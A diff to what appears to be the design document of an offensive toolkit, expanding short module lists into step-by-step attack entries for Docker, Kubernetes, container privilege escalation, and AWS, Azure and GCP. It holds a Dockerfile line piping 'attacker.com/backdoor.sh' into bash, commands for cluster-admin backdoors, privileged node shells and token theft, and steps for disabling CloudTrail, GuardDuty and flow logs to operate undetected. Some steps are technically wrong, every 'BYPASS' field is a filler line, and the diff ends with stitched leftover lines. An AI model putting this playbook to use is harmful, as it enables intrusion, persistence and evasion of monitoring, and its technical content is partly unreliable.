@@ -2668,41 +2668,272 @@ IG-005   │ AV detection test                  │ Bypass success
 
 ```
 DOCKER (8):
-├── docker_escape      — /proc/self/root escape, cgroup escape
-├── docker_socket      — Mount /var/run/docker.sock
-├── docker_secret      — Extract container secrets
-├── docker_network     — Bridge network sniffing
-├── docker_build       — Malicious Dockerfile injection
-├── docker_registry    — Registry poisoning
-├── docker_compose     — Compose file manipulation
-└── docker_inventory   — Container enumeration
+
+1. DOCKER_ESCAPE
+   WHAT: Escape container ke host filesystem
+   HOW:
+   ├── Mount host root: mount -t proc none /tmp/proc
+   ├── Access host: chroot /tmp/proc
+   └── Execute on host: chroot /tmp/proc /bin/bash
+   REQUIREMENTS: --privileged atau SYS_ADMIN capability
+   DETECTION: Monitor mount syscalls, /proc access
+   BYPASS: Use /proc/self/root method
+
+2. DOCKER_SOCKET
+   WHAT: Mount /var/run/docker.sock → full Docker control
+   HOW:
+   ├── docker run -v /var/run/docker.sock:/var/run/docker.sock
+   ├── Access Docker API via socket
+   ├── Create privileged container
+   └── Escape to host
+   DETECTION: Docker socket access
+   BYPASS: Use alternate method
+
+3. DOCKER_SECRET
+   WHAT: Extract secrets dari containers
+   HOW:
+   ├── docker exec container cat /run/secrets/secret_name
+   ├── Or: docker inspect → find secret mounts
+   └── Extract credentials, API keys
+   DETECTION: Secret file access
+   BYPASS: Use alternate method
+
+4. DOCKER_NETWORK
+   WHAT: Sniff bridge network traffic
+   HOW:
+   ├── docker run --net=container:target_container
+   ├── Capture network traffic
+   └── Extract credentials from traffic
+   DETECTION: Network sniffing
+   BYPASS: Use alternate method
+
+5. DOCKER_BUILD
+   WHAT: Inject backdoor via malicious Dockerfile
+   HOW:
+   ├── Modify Dockerfile: RUN curl attacker.com/backdoor.sh | bash
+   ├── Build image: docker build -t backdoored .
+   ├── Push to registry
+   └── Users pull backdoored image
+   DETECTION: Dockerfile audit
+   BYPASS: Use alternate method
+
+6. DOCKER_REGISTRY
+   WHAT: Poison Docker registry → malicious images
+   HOW:
+   ├── Access registry API
+   ├── Replace legitimate image with backdoored version
+   ├── Update tags
+   └── Users pull poisoned image
+   DETECTION: Registry integrity checks
+   BYPASS: Use alternate method
+
+7. DOCKER_COMPOSE
+   WHAT: Manipulate docker-compose.yml → malicious config
+   HOW:
+   ├── Add privileged: true
+   ├── Add volumes: /:/host
+   ├── Add environment variables with credentials
+   └── Deploy malicious stack
+   DETECTION: Compose file audit
+   BYPASS: Use alternate method
+
+8. DOCKER_INVENTORY
+   WHAT: Enumerate all containers
+   HOW:
+   ├── docker ps -a → list all containers
+   ├── docker inspect → get details
+   ├── Find vulnerable containers
+   └── Target weak configurations
+   DETECTION: Container enumeration
+   BYPASS: Use alternate method
 
 KUBERNETES (12):
-├── k8s_api            — API server access (unauthenticated/low-priv)
-├── k8s_etcd           — Etcd dump (cluster secrets)
-├── k8s_secrets        — Extract Secrets from namespace
-├── k8s_configmap      — Read/modify ConfigMaps
-├── k8s_rbac           — RBAC privesc (cluster-admin binding)
-├── k8s_service_account│ — Service account token abuse
-├── k8s_pod            — Pod injection (malicious container)
-├── k8s_node           — Node shell (privileged pod)
-├── k8s_network        — Network policy bypass
-├── k8s_admission      — Admission controller bypass
-├── k8s_cronjob        — CronJob persistence
-└── k8s_helm           — Helm chart poisoning
+
+1. K8S_API
+   WHAT: Access K8s API server (unauthenticated/low-priv)
+   HOW:
+   ├── kubectl get pods (if anonymous access)
+   ├── kubectl get secrets
+   ├── kubectl create deployment
+   └── kubectl exec into pods
+   DETECTION: API server access logs
+   BYPASS: Use service account
+
+2. K8S_ETCD
+   WHAT: Dump etcd → all cluster secrets
+   HOW:
+   ├── Access etcd (port 2379)
+   ├── etcdctl get / --prefix
+   ├── Extract all secrets
+   └── Decrypt with etcd key
+   DETECTION: Etcd access
+   BYPASS: Use alternate method
+
+3. K8S_SECRETS
+   WHAT: Extract Secrets from namespace
+   HOW:
+   ├── kubectl get secrets -n namespace
+   ├── kubectl get secret secret_name -o yaml
+   ├── Decode: echo "base64" | base64 -d
+   └── Extract credentials, API keys
+   DETECTION: Secret access
+   BYPASS: Use alternate method
+
+4. K8S_CONFIGMAP
+   WHAT: Read/modify ConfigMaps
+   HOW:
+   ├── kubectl get configmaps
+   ├── kubectl get configmap name -o yaml
+   ├── Modify configuration
+   └── Inject malicious settings
+   DETECTION: ConfigMap modification
+   BYPASS: Use alternate method
+
+5. K8S_RBAC
+   WHAT: RBAC privesc → cluster-admin binding
+   HOW:
+   ├── kubectl create clusterrolebinding backdoor \
+   │   --clusterrole=cluster-admin \
+   │   --serviceaccount=default:backdoor
+   ├── Now have cluster-admin access
+   └── Full cluster control
+   DETECTION: RBAC changes
+   BYPASS: Use alternate method
+
+6. K8S_SERVICE_ACCOUNT
+   WHAT: Abuse service account tokens
+   HOW:
+   ├── Find service account token: /var/run/secrets/kubernetes.io/serviceaccount/token
+   ├── Use token to access API
+   ├── kubectl --token=token get pods
+   └── Access other namespaces
+   DETECTION: Service account token usage
+   BYPASS: Use alternate method
+
+7. K8S_POD
+   WHAT: Inject malicious container into pod
+   HOW:
+   ├── kubectl run backdoor --image=alpine --restart=Never -- sleep 3600
+   ├── kubectl exec -it backdoor -- /bin/sh
+   ├── Access host via shared namespaces
+   └── Escape to host
+   DETECTION: Pod creation
+   BYPASS: Use alternate method
+
+8. K8S_NODE
+   WHAT: Get node shell via privileged pod
+   HOW:
+   ├── kubectl run node-shell --image=alpine --privileged --hostPID=true
+   ├── chroot /host
+   └── Full node access
+   DETECTION: Privileged pod creation
+   BYPASS: Use alternate method
+
+9. K8S_NETWORK
+   WHAT: Bypass network policies
+   HOW:
+   ├── Find pods without network policies
+   ├── Access services directly
+   ├── Use DNS for service discovery
+   └── Bypass network segmentation
+   DETECTION: Network policy violations
+   BYPASS: Use alternate method
+
+10. K8S_ADMISSION
+    WHAT: Bypass admission controllers
+    HOW:
+    ├── Find admission controller gaps
+    ├── Create resources that bypass validation
+    ├── Use alternate API paths
+    └── Bypass security policies
+    DETECTION: Admission controller logs
+    BYPASS: Use alternate method
+
+11. K8S_CRONJOB
+    WHAT: Persist via CronJob
+    HOW:
+    ├── kubectl create cronjob backdoor --image=alpine --schedule="*/1 * * * *" -- sleep 3600
+    ├── CronJob executes periodically
+    └── Persistent access
+    DETECTION: CronJob creation
+    BYPASS: Use alternate method
+
+12. K8S_HELM
+    WHAT: Poison Helm chart → malicious deployment
+    HOW:
+    ├── Modify Helm chart values.yaml
+    ├── Add malicious containers
+    ├── Deploy poisoned chart
+    └── Malicious pods deployed
+    DETECTION: Helm chart audit
+    BYPASS: Use alternate method
 
 CONTAINER PRIVESC (6):
-├── cap_sys_admin      — Capability abuse
-├── privileged_cont    — Privileged container escape
-├── hostPID            — /proc/pid/ns/nspid escape
-├── hostIPC            — Shared memory attack
-├── hostNetwork        — Network namespace escape
-└── hostPath           — Host filesystem access
 
-FALLBACK:
+1. CAP_SYS_ADMIN
+   WHAT: Abuse SYS_ADMIN capability
+   HOW:
+   ├── Container has SYS_ADMIN capability
+   ├── Mount host filesystem
+   ├── Access host resources
+   └── Escape to host
+   DETECTION: Capability abuse
+   BYPASS: Use alternate method
+
+2. PRIVILEGED_CONTAINER
+   WHAT: Escape privileged container
+   HOW:
+   ├── Container runs with --privileged
+   ├── Full host access
+   ├── Mount host filesystem
+   └── Execute on host
+   DETECTION: Privileged container detection
+   BYPASS: Use alternate method
+
+3. HOSTPID
+   WHAT: Access host PID namespace
+   HOW:
+   ├── --hostPID=true
+   ├── Access /proc/1/ns/pid
+   ├── Enter host PID namespace
+   └── See all host processes
+   DETECTION: PID namespace access
+   BYPASS: Use alternate method
+
+4. HOSTIPC
+   WHAT: Access host IPC namespace
+   HOW:
+   ├── --hostIPC=true
+   ├── Access shared memory segments
+   ├── Communicate with host processes
+   └── Extract data
+   DETECTION: IPC namespace access
+   BYPASS: Use alternate method
+
+5. HOSTNETWORK
+   WHAT: Access host network namespace
+   HOW:
+   ├── --hostNetwork=true
+   ├── Access host network stack
+   ├── Sniff host traffic
+   └── Bypass network policies
+   DETECTION: Network namespace access
+   BYPASS: Use alternate method
+
+6. HOSTPATH
+   WHAT: Access host filesystem via hostPath
+   HOW:
+   ├── volumeMounts: hostPath: /host
+   ├── Access host filesystem
+   ├── Read/write host files
+   └── Escape to host
+   DETECTION: hostPath access
+   BYPASS: Use alternate method
+```
+
+**Fallback:**
 Docker Socket → Container Escape → K8s API → Etcd Dump →
 Service Account → Pod Injection → Node Shell → ALERT
-```
 
 ---
 
@@ -2710,60 +2941,466 @@ Service Account → Pod Injection → Node Shell → ALERT
 
 ```
 AWS (20):
-├── iam_privesc        — iam:CreatePolicy, iam:AttachUserPolicy
-├── iam_user           — iam:CreateLoginProfile, iam:UpdateLoginProfile
-├── iam_role           — iam:CreateRole, iam:PassRole
-├── lambda             — lambda:CreateFunction, lambda:InvokeFunction
-├── s3_bucket          — s3:PutBucketPolicy, s3:PutObject
-├── ec2_instance       — ec2:RunInstances, ec2:CreateKeyPair
-├── ebs_volume         — ebs:CreateSnapshot (cross-account)
-├── rds                — rds:CreateDBSnapshot, rds:ModifyDBInstance
-├── secrets_manager    — secretsmanager:GetSecretValue
-├── ssm_parameter      — ssm:GetParameter
-├── kms                — kms:Decrypt, kms:GenerateDataKey
-├── cloudtrail         — cloudtrail:StopLogging
-├── guardduty          — guardduty:DeleteDetector
-├── vpc_flow           — vpc:DeleteFlowLogs
-├── api_gateway        — apigateway:UpdateRestApiPolicy
-├── ecs                — ecs:RunTask (privileged)
-├── eks                — eks:AccessKubernetesApi
-├── codepipeline       — codepipeline:PutJobSuccessResult
-├── cloudformation     — cloudformation:UpdateStack
-└── ecs_secret         — ecs:DescribeTaskDefinition (secrets)
+
+1. IAM_PRIVESC
+   WHAT: Escalate IAM privileges
+   HOW:
+   ├── Create new policy with full access: iam:CreatePolicy
+   ├── Attach policy to self: iam:AttachUserPolicy
+   └── Now have full AWS access
+   DETECTION: IAM policy changes
+   BYPASS: Use alternate method
+
+2. IAM_USER
+   WHAT: Create backdoor user
+   HOW:
+   ├── iam:CreateLoginProfile → create user with password
+   ├── iam:UpdateLoginProfile → change password
+   └── Login as backdoor user
+   DETECTION: New user creation
+   BYPASS: Use alternate method
+
+3. IAM_ROLE
+   WHAT: Create role for privilege escalation
+   HOW:
+   ├── iam:CreateRole → create role with trust policy
+   ├── iam:PassRole → assume role
+   └── Access as role
+   DETECTION: Role creation
+   BYPASS: Use alternate method
+
+4. LAMBDA
+   WHAT: Create Lambda function for persistence
+   HOW:
+   ├── lambda:CreateFunction → deploy backdoor
+   ├── lambda:InvokeFunction → execute
+   └── Function runs in AWS environment
+   DETECTION: Lambda function creation
+   BYPASS: Use alternate method
+
+5. S3_BUCKET
+   WHAT: Access S3 buckets
+   HOW:
+   ├── s3:PutBucketPolicy → modify bucket policy
+   ├── s3:PutObject → upload files
+   └── Access bucket data
+   DETECTION: S3 policy changes
+   BYPASS: Use alternate method
+
+6. EC2_INSTANCE
+   WHAT: Create EC2 instance for access
+   HOW:
+   ├── ec2:RunInstances → launch instance
+   ├── ec2:CreateKeyPair → get SSH key
+   └── SSH into instance
+   DETECTION: Instance creation
+   BYPASS: Use alternate method
+
+7. EBS_VOLUME
+   WHAT: Snapshot EBS volume → cross-account
+   HOW:
+   ├── ebs:CreateSnapshot → snapshot volume
+   ├── Share snapshot cross-account
+   └── Access data in other account
+   DETECTION: Snapshot creation
+   BYPASS: Use alternate method
+
+8. RDS
+   WHAT: Access RDS database
+   HOW:
+   ├── rds:CreateDBSnapshot → snapshot database
+   ├── rds:ModifyDBInstance → change settings
+   └── Access database data
+   DETECTION: RDS modifications
+   BYPASS: Use alternate method
+
+9. SECRETS_MANAGER
+   WHAT: Extract secrets from Secrets Manager
+   HOW:
+   ├── secretsmanager:GetSecretValue → read secret
+   ├── Extract credentials, API keys
+   └── Use for further access
+   DETECTION: Secret access
+   BYPASS: Use alternate method
+
+10. SSM_PARAMETER
+    WHAT: Extract parameters from SSM
+    HOW:
+    ├── ssm:GetParameter → read parameter
+    ├── Extract configuration data
+    └── Use for further access
+    DETECTION: Parameter access
+    BYPASS: Use alternate method
+
+11. KMS
+    WHAT: Decrypt data with KMS
+    HOW:
+    ├── kms:Decrypt → decrypt encrypted data
+    ├── kms:GenerateDataKey → generate new key
+    └── Access encrypted data
+    DETECTION: KMS operations
+    BYPASS: Use alternate method
+
+12. CLOUDTRAIL
+    WHAT: Stop CloudTrail logging
+    HOW:
+    ├── cloudtrail:StopLogging → stop trail
+    ├── Activity no longer logged
+    └── Operate undetected
+    DETECTION: CloudTrail stop
+    BYPASS: Use alternate method
+
+13. GUARDDUTY
+    WHAT: Disable GuardDuty
+    HOW:
+    ├── guardduty:DeleteDetector → delete detector
+    ├── Threat detection disabled
+    └── Operate undetected
+    DETECTION: GuardDuty deletion
+    BYPASS: Use alternate method
+
+14. VPC_FLOW
+    WHAT: Delete VPC flow logs
+    HOW:
+    ├── vpc:DeleteFlowLogs → delete logs
+    ├── Network activity no longer logged
+    └── Operate undetected
+    DETECTION: Flow log deletion
+    BYPASS: Use alternate method
+
+15. API_GATEWAY
+    WHAT: Modify API Gateway policy
+    HOW:
+    ├── apigateway:UpdateRestApiPolicy → modify policy
+    ├── Add backdoor access
+    └── Access API
+    DETECTION: API Gateway changes
+    BYPASS: Use alternate method
+
+16. ECS
+    WHAT: Run privileged ECS task
+    HOW:
+    ├── ecs:RunTask → run privileged task
+    ├── Task has host access
+    └── Escape to host
+    DETECTION: ECS task creation
+    BYPASS: Use alternate method
+
+17. EKS
+    WHAT: Access EKS cluster
+    HOW:
+    ├── eks:AccessKubernetesApi → get cluster access
+    ├── kubectl access cluster
+    └── Full cluster control
+    DETECTION: EKS access
+    BYPASS: Use alternate method
+
+18. CODEPIPELINE
+    WHAT: Poison CodePipeline
+    HOW:
+    ├── codepipeline:PutJobSuccessResult → inject code
+    ├── Malicious code deployed
+    └── Backdoor in production
+    DETECTION: Pipeline modification
+    BYPASS: Use alternate method
+
+19. CLOUDFORMATION
+    WHAT: Modify CloudFormation stack
+    HOW:
+    ├── cloudformation:UpdateStack → add resources
+    ├── Malicious resources deployed
+    └── Infrastructure compromised
+    DETECTION: Stack modification
+    BYPASS: Use alternate method
+
+20. ECS_SECRET
+    WHAT: Extract ECS task secrets
+    HOW:
+    ├── ecs:DescribeTaskDefinition → read secrets
+    ├── Extract credentials
+    └── Use for further access
+    DETECTION: Secret access
+    BYPASS: Use alternate method
 
 AZURE (18):
-├── az_ad              — Microsoft.Graph: Application.ReadWrite.All
-├── az_managed_id      — Managed Identity impersonation
-├── az_key_vault       — Key Vault secret extraction
-├── az_storage         — Storage account key abuse
-├── az_sql             — SQL admin access
-├── az_vm              — VM extension install
-├── az_aks             — AKS cluster admin
-├── az_function        — Function App code injection
-├── az_devops          — DevOps pipeline abuse
-├── az_resource_group  — Resource group owner
-├── az_subscription    — Subscription owner
-├── az_policy          — Policy exemption
-├── az_role            — Role assignment
-├── az_cosmosdb        — Cosmos DB account access
-├── az_dns             — DNS zone manipulation
-├── az_cdn             — CDN endpoint manipulation
-├── az_arm_template    — ARM template injection
-└── az_graph           — Azure AD Graph enumeration
+
+1. AZ_AD
+   WHAT: Modify Azure AD
+   HOW:
+   ├── Microsoft.Graph: Application.ReadWrite.All
+   ├── Create application with backdoor
+   └── Access via application
+   DETECTION: AD changes
+   BYPASS: Use alternate method
+
+2. AZ_MANAGED_ID
+   WHAT: Impersonate managed identity
+   HOW:
+   ├── Access managed identity token
+   ├── Use token for Azure services
+   └── Access as managed identity
+   DETECTION: Token usage
+   BYPASS: Use alternate method
+
+3. AZ_KEY_VAULT
+   WHAT: Extract Key Vault secrets
+   HOW:
+   ├── Access Key Vault
+   ├── GetSecret → read secrets
+   └── Extract credentials, keys
+   DETECTION: Secret access
+   BYPASS: Use alternate method
+
+4. AZ_STORAGE
+   WHAT: Access storage account
+   HOW:
+   ├── Get storage account key
+   ├── Access blob storage
+   └── Extract data
+   DETECTION: Storage access
+   BYPASS: Use alternate method
+
+5. AZ_SQL
+   WHAT: Access SQL database
+   HOW:
+   ├── Get SQL admin access
+   ├── Query database
+   └── Extract data
+   DETECTION: SQL access
+   BYPASS: Use alternate method
+
+6. AZ_VM
+   WHAT: Install VM extension
+   HOW:
+   ├── az vm extension set → install extension
+   ├── Extension runs with SYSTEM access
+   └── Full VM control
+   DETECTION: Extension installation
+   BYPASS: Use alternate method
+
+7. AZ_AKS
+   WHAT: Access AKS cluster
+   HOW:
+   ├── az aks get-credentials → get cluster access
+   ├── kubectl access cluster
+   └── Full cluster control
+   DETECTION: AKS access
+   BYPASS: Use alternate method
+
+8. AZ_FUNCTION
+   WHAT: Inject Function App code
+   HOW:
+   ├── Access Function App
+   ├── Modify function code
+   └── Malicious code executes
+   DETECTION: Function modification
+   BYPASS: Use alternate method
+
+9. AZ_DEVOPS
+   WHAT: Poison Azure DevOps pipeline
+   HOW:
+   ├── Access DevOps project
+   ├── Modify pipeline YAML
+   ├── Malicious code deployed
+   └── Backdoor in production
+   DETECTION: Pipeline modification
+   BYPASS: Use alternate method
+
+10. AZ_RESOURCE_GROUP
+    WHAT: Access resource group
+    HOW:
+    ├── az role assignment create → assign role
+    ├── Full resource group access
+    └── Access all resources
+    DETECTION: Role assignment
+    BYPASS: Use alternate method
+
+11. AZ_SUBSCRIPTION
+    WHAT: Access subscription
+    HOW:
+    ├── az role assignment create → assign Owner
+    ├── Full subscription access
+    └── Access all resources
+    DETECTION: Role assignment
+    BYPASS: Use alternate method
+
+12. AZ_POLICY
+    WHAT: Exempt from policy
+    HOW:
+    ├── az policy assignment create → create exemption
+    ├── Security policies bypassed
+    └── Operate without restrictions
+    DETECTION: Policy exemption
+    BYPASS: Use alternate method
+
+13. AZ_ROLE
+    WHAT: Assign roles
+    HOW:
+    ├── az role assignment create → assign role
+    ├── Privilege escalation
+    └── Access as privileged role
+    DETECTION: Role assignment
+    BYPASS: Use alternate method
+
+14. AZ_COSMOSDB
+    WHAT: Access Cosmos DB
+    HOW:
+    ├── Get Cosmos DB keys
+    ├── Query database
+    └── Extract data
+    DETECTION: Database access
+    BYPASS: Use alternate method
+
+15. AZ_DNS
+    WHAT: Manipulate DNS zone
+    HOW:
+    ├── az network dns record-set create → create record
+    ├── Point domain to attacker
+    └── Phishing or C2
+    DETECTION: DNS changes
+    BYPASS: Use alternate method
+
+16. AZ_CDN
+    WHAT: Manipulate CDN endpoint
+    HOW:
+    ├── az cdn endpoint create → create endpoint
+    ├── Serve malicious content
+    └── Attack users
+    DETECTION: CDN changes
+    BYPASS: Use alternate method
+
+17. AZ_ARM_TEMPLATE
+    WHAT: Inject ARM template
+    HOW:
+    ├── Create ARM template with backdoor
+    ├── Deploy template
+    └── Malicious resources deployed
+    DETECTION: Template deployment
+    BYPASS: Use alternate method
+
+18. AZ_GRAPH
+    WHAT: Enumerate Azure AD
+    HOW:
+    ├── az ad user list → enumerate users
+    ├── az ad group list → enumerate groups
+    └── Map environment
+    DETECTION: Enumeration
+    BYPASS: Use alternate method
 
 GCP (16):
-├── gcp_iam            — iam.serviceAccountKeys.create
-├── gcp_service_acct   — serviceAccount impersonation
-├── gcp_compute        — compute.instances.setMetadata
-├── gcp_storage        — storage.objects.create (bucket)
-├── gcp_sql            — sql.instances.create (public IP)
-├── gcp_kms            — cryptoKey.decrypt
-├── gcp_secret_manager │ — secretmanager.secrets.get
-├── gcp_gke            — container.clusters.getCredentials
-├── gcp_cloud_function │ — cloudfunctions.functions.create
-├── gcp_bigquery       — bigquery.jobs.create (data exfil)
-├── gcp_pubsub         — pubsub.topics.publish
-├── gcp_firestore      — firestore.documents.get
+
+1. GCP_IAM
+   WHAT: Create service account key
+   HOW:
+   ├── iam.serviceAccountKeys.create → create key
+   ├── Use key for authentication
+   └── Access as service account
+   DETECTION: Key creation
+   BYPASS: Use alternate method
+
+2. GCP_SERVICE_ACCT
+   WHAT: Impersonate service account
+   HOW:
+   ├── iam.serviceAccounts.actAs → impersonate
+   ├── Use impersonated identity
+   └── Access as service account
+   DETECTION: Impersonation
+   BYPASS: Use alternate method
+
+3. GCP_COMPUTE
+   WHAT: Modify VM metadata
+   HOW:
+   ├── compute.instances.setMetadata → add SSH key
+   ├── SSH into VM
+   └── Full VM access
+   DETECTION: Metadata changes
+   BYPASS: Use alternate method
+
+4. GCP_STORAGE
+   WHAT: Access GCS bucket
+   HOW:
+   ├── storage.objects.create → upload files
+   ├── Access bucket data
+   └── Extract data
+   DETECTION: Bucket access
+   BYPASS: Use alternate method
+
+5. GCP_SQL
+   WHAT: Access Cloud SQL
+   HOW:
+   ├── sql.instances.create → create instance
+   ├── Access database
+   └── Extract data
+   DETECTION: SQL instance creation
+   BYPASS: Use alternate method
+
+6. GCP_KMS
+   WHAT: Decrypt with KMS
+   HOW:
+   ├── cryptoKey.decrypt → decrypt data
+   ├── Access encrypted data
+   └── Use for further access
+   DETECTION: KMS operations
+   BYPASS: Use alternate method
+
+7. GCP_SECRET_MANAGER
+   WHAT: Extract secrets
+   HOW:
+   ├── secretmanager.secrets.get → read secret
+   ├── Extract credentials
+   └── Use for further access
+   DETECTION: Secret access
+   BYPASS: Use alternate method
+
+8. GCP_GKE
+   WHAT: Access GKE cluster
+   HOW:
+   ├── container.clusters.getCredentials → get cluster access
+   ├── kubectl access cluster
+   └── Full cluster control
+   DETECTION: GKE access
+   BYPASS: Use alternate method
+
+9. GCP_CLOUD_FUNCTION
+   WHAT: Create Cloud Function
+   HOW:
+   ├── cloudfunctions.functions.create → deploy function
+   ├── Function executes in GCP
+   └── Backdoor in serverless
+   DETECTION: Function creation
+   BYPASS: Use alternate method
+
+10. GCP_BIGQUERY
+    WHAT: Query BigQuery
+    HOW:
+    ├── bigquery.jobs.create → run query
+    ├── Extract data
+    └── Exfiltrate large datasets
+    DETECTION: BigQuery queries
+    BYPASS: Use alternate method
+
+11. GCP_PUBSUB
+    WHAT: Publish to Pub/Sub
+    HOW:
+    ├── pubsub.topics.publish → publish message
+    ├── Trigger functions
+    └── Data exfiltration
+    DETECTION: Pub/Sub publish
+    BYPASS: Use alternate method
+
+12. GCP_FIRESTORE
+    WHAT: Access Firestore
+    HOW:
+    ├── firestore.documents.get → read documents
+    ├── Extract data
+    └── Modify data
+    DETECTION: Firestore access
+    BYPASS: Use alternate method
+```
+
+**Fallback:**
+AWS IAM → Lambda → S3 → EC2 → Azure AD → Key Vault →
+GCP IAM → Compute → Storage → ALERT
 ├── gcp_logging        — logging.sinks.delete
 ├── gcp_audit_config   — auditConfigs modification
 ├── gcp_organization   — orgPolicy.disable
